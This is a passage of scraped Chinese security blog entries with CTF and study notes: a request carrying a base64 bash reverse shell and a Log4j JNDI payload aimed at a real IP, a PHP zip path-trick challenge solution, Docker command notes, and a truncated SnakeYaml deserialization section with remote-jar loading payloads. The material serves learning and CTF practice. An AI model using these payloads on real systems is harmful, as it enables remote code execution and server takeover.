</span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-ini"><span class="hljs-attr">payload</span>=<span class="hljs-variable">$&#123;jndi:ldap://118.89.61.71:1389/Basic/SpringEcho&#125;</span></span></code></pre></div><h2 id="noumisotuitennnoka"><a href="#noumisotuitennnoka" class="headerlink" title="noumisotuitennnoka"></a>noumisotuitennnoka</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;/tmp&#x27;</span>;<span class="hljs-variable">$htContent</span> = <span class="hljs-string">&lt;&lt;&lt;EOT</span><span class="hljs-string">&lt;Files &quot;backdoor.php&quot;&gt;</span><span class="hljs-string">    Deny from all</span><span class="hljs-string">&lt;/Files&gt;</span><span class="hljs-string">EOT</span>;<span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;create&#x27;</span>;<span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>] ?? <span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;/flag&quot;);@unlink(__FILE__);&#x27;</span>;<span class="hljs-variable">$subdir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;subdir&#x27;</span>] ?? <span class="hljs-string">&#x27;/jsons&#x27;</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/\.?[a-z]+$/&#x27;</span>, <span class="hljs-variable">$subdir</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$subdir</span>) &gt; <span class="hljs-number">10</span>)    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;....&quot;</span>);<span class="hljs-variable">$jsonDir</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$subdir</span>;<span class="hljs-variable">$escapeDir</span> = <span class="hljs-string">&#x27;/var/www/html&#x27;</span> . <span class="hljs-variable">$subdir</span>; <span class="hljs-variable">$archiveFile</span> = <span class="hljs-variable">$jsonDir</span> . <span class="hljs-string">&#x27;/archive.zip&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;create&#x27;</span>)&#123;    <span class="hljs-comment">// create jsons/api.json</span>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$jsonDir</span>);    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$jsonDir</span>. <span class="hljs-string">&#x27;/backdoor.php&#x27;</span>, <span class="hljs-variable">$content</span>);    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$jsonDir</span>.<span class="hljs-string">&#x27;/.htaccess&#x27;</span>,<span class="hljs-variable">$htContent</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;zip&#x27;</span>)&#123;    <span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-variable">$archiveFile</span>);    <span class="hljs-comment">// create archive.zip</span>    <span class="hljs-variable">$dev_dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dev&#x27;</span>] ?? <span class="hljs-variable">$dir</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$dev_dir</span>) !== <span class="hljs-variable">$dir</span>)        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;...&#x27;</span>);    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$archiveFile</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addGlob</span>(<span class="hljs-variable">$jsonDir</span> . <span class="hljs-string">&#x27;/**&#x27;</span>, <span class="hljs-number">0</span>, [<span class="hljs-string">&#x27;add_path&#x27;</span> =&gt; <span class="hljs-string">&#x27;var/www/html/&#x27;</span>, <span class="hljs-string">&#x27;remove_path&#x27;</span> =&gt; <span class="hljs-variable">$dev_dir</span>]);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addGlob</span>(<span class="hljs-variable">$jsonDir</span> . <span class="hljs-string">&#x27;/.htaccess&#x27;</span>, <span class="hljs-number">0</span>, [<span class="hljs-string">&#x27;add_path&#x27;</span> =&gt; <span class="hljs-string">&#x27;var/www/html/&#x27;</span>, <span class="hljs-string">&#x27;remove_path&#x27;</span> =&gt; <span class="hljs-variable">$dev_dir</span>]);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;unzip&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$archiveFile</span>))&#123;    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$archiveFile</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;/&#x27;</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;clean&#x27;</span>)&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$escapeDir</span>))        <span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-variable">$escapeDir</span>);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed.(/var/www/html)&quot;</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$jsonDir</span>))        <span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-variable">$jsonDir</span>);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed.(/tmp)&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$path</span>))        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$path</span>))         @<span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$path</span>);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//blog.tyage.net/archive/p944.html</span><span class="hljs-attr">action</span><span class="hljs-operator">=</span>create<span class="hljs-variable">&amp;subdir</span>=/a<span class="hljs-attr">action</span><span class="hljs-operator">=</span>zip<span class="hljs-variable">&amp;dev</span>=<span class="hljs-keyword">/tmp/</span>/<span class="hljs-variable">&amp;subdir</span>=/a<span class="hljs-attr">action</span><span class="hljs-operator">=</span>unzip<span class="hljs-variable">&amp;dev</span>=<span class="hljs-keyword">/tmp/</span>/<span class="hljs-variable">&amp;subdir</span>=/a<span class="hljs-attr">action</span><span class="hljs-operator">=</span>clean<span class="hljs-variable">&amp;dev</span>=<span class="hljs-keyword">/tmp/</span>/<span class="hljs-variable">&amp;subdir</span>=/.htaccessremove_path会删除一个字符     <span class="hljs-meta">#刚开始在php.bug中有找到，但后面找不到就懒得找了</span><span class="hljs-keyword">/tmp/</span>/ 会删除两个字符（大佬说的）<span class="hljs-keyword">/tmp/</span>.  也行因为realpath会去除多余的/，./  ，所以随便尝试，也不知道为什么<span class="hljs-keyword">/tmp/</span>/能行反正要达到的效果就是<span class="hljs-keyword">/var/</span>www<span class="hljs-keyword">/html/</span>.htaccess，即把.htaccess文件放在<span class="hljs-keyword">/var/</span>www/html目录下，然后删掉<span class="hljs-keyword">/tmp/</span>a/.htaccess   (子目录名字不一定是一个字符)<span class="hljs-keyword">/tmp/</span>.htaccess<span class="hljs-keyword">/tmp/</span><span class="hljs-number">123</span>/.htaccess      (完整的路径)<span class="hljs-keyword">/tmp/</span><span class="hljs-number">3</span>/.htaccess         (被去除后的htaccess目录)<span class="hljs-keyword">/tmp/</span><span class="hljs-number">123</span>/backdoor.php    (去除后的backdoor目录)    配置文件htaccess不在同一个目录下了，直接访问即可</code></pre></div><p><img src="/../images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/image-20231112013029180.png" alt="image-20231112013029180"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2023/11/11/docker/"/>
    <url>/2023/11/11/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><div class="code-wrapper"><pre><code class="hljs reasonml">docker imagesdocker search 镜像docker pull 镜像:latestdocker system df    所占空间docker rmi xxxdocker rmi -f <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">images</span> -<span class="hljs-params">aq</span>)</span> 删除全部</code></pre></div><h2 id="ubuntu容器"><a href="#ubuntu容器" class="headerlink" title="ubuntu容器"></a>ubuntu容器</h2><div class="code-wrapper"><pre><code class="hljs routeros">docker pull ubuntudocker <span class="hljs-built_in">run</span> [options]image[command][arg]<span class="hljs-attribute">--name</span>=<span class="hljs-string">&quot;名字&quot;</span>-d 后台运行-i 交互模式运行容器，通常与-t同时使用-t 分配一个伪输入终端，通常与-i同时使用-P 随机端口-p 指定端口docker <span class="hljs-built_in">run</span> -it ubuntu /bin/bashdocker ps 查看正在运行的容器docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--name</span>=kino ubuntu bash</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#退出容器</span>run进容器,<span class="hljs-keyword">exit</span>或CTRL+D 容器停止，docker ps中无容器run进容器，CTRL+p+q 容器不停止，docker ps能看到容器root@xxxxxx:/<span class="hljs-comment"># read escape sequence</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#重连容器</span>容器未停止：docker attach 容器ID或名字容器停止：docker start 容器ID或名字再docker attach 容器ID或名字docker exec -it 容器名字 <span class="hljs-regexp">/bin/</span>bashattach与exec的区别:attach直接进入容器启动命令的终端，不会启动新的进程，用<span class="hljs-keyword">exit</span>退出，会导致容器停止exec打开新的终端，并且可以启动新的进程，用<span class="hljs-keyword">exit</span>退出，不会导致容器停止</code></pre></div><div class="code-wrapper"><pre><code class="hljs powershell">docker restart 容器ID/namedocker stop 容器ID/namedocker <span class="hljs-built_in">kill</span> 容器ID/name<span class="hljs-comment">#删除容器</span>docker <span class="hljs-built_in">rm</span> 容器ID/namedocker <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> 容器一次删除多个容器docker <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-aq</span>)docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-aq</span>|xargs docker <span class="hljs-built_in">rm</span>      xargs一般配合管道符使用</code></pre></div><h3 id="重要指令"><a href="#重要指令" class="headerlink" title="重要指令"></a>重要指令</h3><p><code>docker run -d</code>:后台跑一个容器，如果跑的是Ubuntu就不会成功，准确的说是一旦启动就会停止，因为Ubuntu是一个操作系统不是一个后台程序   ！！！</p><p>以redis演示前后台区别</p><div class="code-wrapper"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--name</span>=zero redisctrl+c 退出容器就停止docker <span class="hljs-built_in">run</span> -d <span class="hljs-attribute">--name</span>=zero redis后台模式，不会停止</code></pre></div><div class="code-wrapper"><pre><code class="hljs coq">docker logs 容器   容器日志docker <span class="hljs-built_in">top</span> 容器    查看容器内进程docker inspect 容器    容器细节</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">容器内拷贝文件docker <span class="hljs-built_in">cp</span> 容器ID或名字:容器内路径 目标主机路径docker <span class="hljs-built_in">cp</span> zero:/tmp/1.txt /opt</code></pre></div><div class="code-wrapper"><pre><code class="hljs elm">导入与导出容器<span class="hljs-title">export</span> : 导出容器的内容流作为一个tar归档<span class="hljs-title">docker</span> ex<span class="hljs-keyword">port</span> 容器名 &gt; /opt/ubuntu.tar<span class="hljs-keyword">import</span>从tar包的内容创建一个新文件系统，再导入为镜像<span class="hljs-title">cat</span> 文件名.tar|docker <span class="hljs-keyword">import</span>- 镜像用户/镜像名：版本号</code></pre></div><h2 id="Commit命令"><a href="#Commit命令" class="headerlink" title="Commit命令"></a>Commit命令</h2><p>进入容器首先要<code>apt update</code>,然后才能用<code>apt install</code></p><p>docker commit制作镜像</p><div class="code-wrapper"><pre><code class="hljs routeros">docker commit <span class="hljs-attribute">-m</span>=<span class="hljs-string">&quot;需要提交的信息&quot;</span> <span class="hljs-attribute">-a</span>=<span class="hljs-string">&quot;作者&quot;</span> 容器ID 要创建的目标镜像名:[标签名]docker commit <span class="hljs-attribute">-m</span>=<span class="hljs-string">&quot;add vim ok&quot;</span> <span class="hljs-attribute">-a</span>=<span class="hljs-string">&quot;yyl&quot;</span> kino myubuntu</code></pre></div><h3 id="上传阿里云"><a href="#上传阿里云" class="headerlink" title="上传阿里云"></a>上传阿里云</h3><h3 id="docker私有库"><a href="#docker私有库" class="headerlink" title="docker私有库"></a>docker私有库</h3><p>registry</p><h2 id="容器卷-（-v-最好都带上–privileged-true）"><a href="#容器卷-（-v-最好都带上–privileged-true）" class="headerlink" title="容器卷 （-v 最好都带上–privileged&#x3D;true）"></a>容器卷 （-v 最好都带上–privileged&#x3D;true）</h2><div class="code-wrapper"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it -v 宿主机绝对路径:容器内目录 镜像名 <span class="hljs-attribute">--privileged</span>=<span class="hljs-literal">true</span></code></pre></div><p>容器卷与主机互通互联</p><div class="code-wrapper"><pre><code class="hljs gradle">docker run -it --privileged=<span class="hljs-keyword">true</span> -v <span class="hljs-regexp">/tmp/</span>data:<span class="hljs-regexp">/tmp/</span>data myubuntu <span class="hljs-regexp">/bin/</span>bash在主机或在容器内的<span class="hljs-regexp">/tmp/</span>data目录下创建文件，另一边都会同步</code></pre></div><p>当我们的容器停止时，在主机内&#x2F;tmp&#x2F;myhostdata里面写入文件，在start容器，发现依旧同步过去了</p><h2 id="安装软件-在运行时要-p端口，最好是-d后台模式"><a href="#安装软件-在运行时要-p端口，最好是-d后台模式" class="headerlink" title="安装软件 (在运行时要-p端口，最好是-d后台模式)"></a>安装软件 (在运行时要-p端口，最好是-d后台模式)</h2><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><div class="code-wrapper"><pre><code class="hljs applescript">docker pull tomcatdocker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--name=tomcat1 -p 8080:8080 tomcat </span>docker exec -<span class="hljs-keyword">it</span> tomcat1 /bin/bash   <span class="hljs-comment">#进入虚拟终端</span>最新版tomcat还无法访问要先删除rm -r webapps然后mv webapps.dist webapps <span class="hljs-comment">#把webapps.dist重命名，因为真正的内容在webapps.dist中</span>最后访问映射的端口即可</code></pre></div><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span><span class="hljs-attribute">docker</span> run -it -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> --name mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span><span class="hljs-comment"># 一些参数的顺序不能错，错了启动不成功</span></code></pre></div><p>有好多就不试了</p><p>感觉用不上</p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>基础知识</p><ul><li>每条保留指令都必须为大写字母且后面要跟至少一个参数</li><li>指令按照从上往下顺序进行</li><li>#表示注释</li><li>每条指令都会创建一个新的镜像层并对镜像进行提交</li></ul><div class="code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> 指定是基于哪个镜像的，第一条必须是<span class="hljs-keyword">FROM</span><span class="hljs-keyword">MAINTAINER</span>  镜像维护者姓名和邮箱地址<span class="hljs-keyword">RUN</span><span class="language-bash"> 镜像构建时需要运行的命令</span>有两种格式，<span class="hljs-keyword">shell</span><span class="language-bash">和<span class="hljs-built_in">exec</span>格式，run在docker build时运行</span><span class="hljs-keyword">EXPOSE</span> 暴露的端口<span class="hljs-keyword">WORKDIR</span><span class="language-bash"> 终端默认登陆的目录</span><span class="hljs-keyword">USER</span> 指定用户<span class="hljs-keyword">ENV</span> 设置环境变量/* * <span class="hljs-keyword">ENV</span> MY_PATH /usr/mytest * <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> <span class="hljs-variable">$MY_PATH</span></span> */  <span class="hljs-keyword">VOLUME</span><span class="language-bash">: 容器卷</span><span class="hljs-keyword">ADD</span><span class="language-bash">: 江苏主机目录下的文件拷贝进镜像且会自动处理URL和解压tar压缩包</span><span class="hljs-keyword">CMD</span><span class="language-bash">: 容器启动后要干的事</span>/* * <span class="hljs-keyword">shell</span><span class="language-bash">格式: CMD &lt;命令&gt;</span> * exec格式: <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>,<span class="hljs-string">&quot;参数1&quot;</span>,<span class="hljs-string">&quot;参数2&quot;</span>]</span> *参数列表格式: <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;参数1&quot;</span>,<span class="hljs-string">&quot;参数2&quot;</span>]</span> */  <span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;&lt;executeable&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>]</span>当<span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash">与CMD同时存在时，CMD的作用是给ENTRYPOINT传递参数</span>/* *<span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>]</span> *<span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/etc/nginx/nginx.conf&quot;</span>]</span> */</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#boogipop大佬的案例</span>FROM centos:<span class="hljs-number">7</span><span class="hljs-comment">#新版centos8会对yum报错，引用centos7</span>MAINTAINER zzyy&lt;zzyybs@<span class="hljs-number">126</span>.com&gt; ENV MYPATH <span class="hljs-regexp">/usr/</span>localWORKDIR <span class="hljs-variable">$MYPATH</span> <span class="hljs-comment">#安装vim编辑器</span>RUN yum -y install vim<span class="hljs-comment">#安装ifconfig命令查看网络IP</span>RUN yum -y install net-tools<span class="hljs-comment">#安装java8及lib库</span>RUN yum -y install glibc.i686RUN mkdir <span class="hljs-regexp">/usr/</span>local/java<span class="hljs-comment">#ADD 是相对路径jar,把jdk-8u191-linux-x64.tar.gz添加到容器中,安装包必须要和Dockerfile文件在同一位置</span>ADD jdk-<span class="hljs-number">8</span>u191-linux-x64.tar.gz <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span><span class="hljs-comment">#配置java环境变量</span>ENV JAVA_HOME <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk1.<span class="hljs-number">8.0</span>_191ENV JRE_HOME <span class="hljs-variable">$JAVA_HOME</span>/jreENV CLASSPATH <span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>dt.jar:<span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>tools.jar:<span class="hljs-variable">$JRE_HOME</span>/lib:<span class="hljs-variable">$CLASSPATH</span>ENV PATH <span class="hljs-variable">$JAVA_HOME</span>/bin:<span class="hljs-variable">$PATH</span> EXPOSE <span class="hljs-number">80</span> CMD echo <span class="hljs-variable">$MYPATH</span>CMD echo <span class="hljs-string">&quot;success--------------ok&quot;</span>CMD <span class="hljs-regexp">/bin/</span>bash</code></pre></div><p><code>docker build -t centosjava8:1.5 .</code></p><p><code>docker run -it --name=centos-1 centosjava8:1.5 /bin/bash</code></p><h2 id="Docker-network"><a href="#Docker-network" class="headerlink" title="Docker network"></a>Docker network</h2><p>安装docker后，在ifconfig中会看到一个docker0的虚拟网桥</p><p>docker就是通过这个虚拟网桥来和宿主机交流</p><p><code>docker network ls</code>：查看docker网络模式</p><p><code>docker network create 网络名字</code>：创建一个网络</p><p><code>docker network inspect 网络名字</code>：查看网络配置</p><p><img src="/../images/docker/image-20231112183200644.png" alt="image-20231112183200644"></p><p><img src="/../images/docker/image-20231112183302812.png" alt="image-20231112183302812"></p><p>说明这个ip是变动的</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml反序列化</title>
    <link href="/2023/11/05/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/11/05/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Yaml语法"><a href="#Yaml语法" class="headerlink" title="Yaml语法"></a>Yaml语法</h1><ol><li>YAML大小写敏感；</li><li>使用缩进代表层级关系；</li><li>缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li></ol><div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">key:</span> <span class="hljs-string">value</span>      <span class="hljs-string">(value前有空格)</span><span class="hljs-attr">key:</span>     <span class="hljs-attr">child-key:</span> <span class="hljs-string">value</span>    <span class="hljs-attr">child-key2:</span> <span class="hljs-string">value2</span>     <span class="hljs-string">//缩进表层级关系</span><span class="hljs-string">数组</span><span class="hljs-attr">hobby:</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">java</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">lol</span>    <span class="hljs-string">//常量</span><span class="hljs-attr">int:</span>    <span class="hljs-bullet">-</span> <span class="hljs-number">123</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">0b1010</span><span class="hljs-attr">String:</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;hello&quot;</span></code></pre></div><h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><ul><li>Yaml.dump()：将一个对象转化为yaml文件形式；   &#x2F;&#x2F;序列化</li><li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；     &#x2F;&#x2F;反序列化</li></ul><div class="code-wrapper"><pre><code class="hljs pgsql">package snakeyaml;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">User</span> &#123;    <span class="hljs-type">int</span> age;    String <span class="hljs-type">name</span>;    <span class="hljs-built_in">public</span> <span class="hljs-keyword">User</span>()&#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;构造&quot;);    &#125;    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setAge(<span class="hljs-type">int</span> age) &#123;        this.age = age;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;setage&quot;);    &#125;    <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> getAge() &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;getage&quot;);        <span class="hljs-keyword">return</span> age;    &#125;    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> setName(String <span class="hljs-type">name</span>) &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;setname&quot;);        this.name = <span class="hljs-type">name</span>;    &#125;    <span class="hljs-built_in">public</span> String getName() &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;getname&quot;);        <span class="hljs-keyword">return</span> <span class="hljs-type">name</span>;    &#125;&#125;package snakeyaml;<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> test &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        serialize();        unserialize();    &#125;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> serialize()&#123;        <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">User</span>();        <span class="hljs-keyword">user</span>.setName(&quot;zero&quot;);        <span class="hljs-keyword">user</span>.setAge(<span class="hljs-number">19</span>);        Yaml yaml = <span class="hljs-built_in">new</span> Yaml();        String dump = yaml.dump(<span class="hljs-keyword">user</span>);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(dump);    &#125;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> unserialize()&#123;        String str1 = &quot;!!snakeyaml.User &#123;age: 19, name: zero&#125;&quot;;        String str2 = &quot;age: 19\n&quot; +                &quot;name: zero&quot;;        Yaml yaml = <span class="hljs-built_in">new</span> Yaml();        yaml.<span class="hljs-keyword">load</span>(str1);        yaml.loadAs(str2, <span class="hljs-keyword">User</span>.<span class="hljs-keyword">class</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs crmsh">构造setnamesetagegetagegetname!!snakeyaml.<span class="hljs-keyword">User</span> <span class="hljs-title">&#123;age</span>: <span class="hljs-number">19</span>, name: zero&#125;构造setagesetname构造setagesetname</code></pre></div><p>强制类型转化<code>!!</code>相当于<code>fastjson</code>中的<code>@type</code>指定反序列化的类名</p><p><strong>注意通过<code>!!</code>指定类名需要写全类名</strong></p><p><code>load</code>和<code>loadAs</code>都调用了对应的setter方法，而且<code>loadAs</code>可以直接指定参数值，不用再指定类</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><div class="code-wrapper"><pre><code class="hljs abnf">String context <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://1q7ha5.dnslog.cn\&quot;]]]]&quot;</span><span class="hljs-comment">;</span>Yaml yaml <span class="hljs-operator">=</span> new Yaml()<span class="hljs-comment">;</span>yaml.load(context)<span class="hljs-comment">;</span></code></pre></div><p>这个可以用来检测漏洞存在</p><p>具体脚本看<a href="https://github.com/artsploit/yaml-payload/">github项目</a>按照作者说的</p><div class="code-wrapper"><pre><code class="hljs awk">javac src<span class="hljs-regexp">/artsploit/</span>AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .</code></pre></div><p>要注意使用低版本jdk来编译java文件</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>        <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>        <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>http://127.0.0.1:8000/yaml-payload.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>        <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span 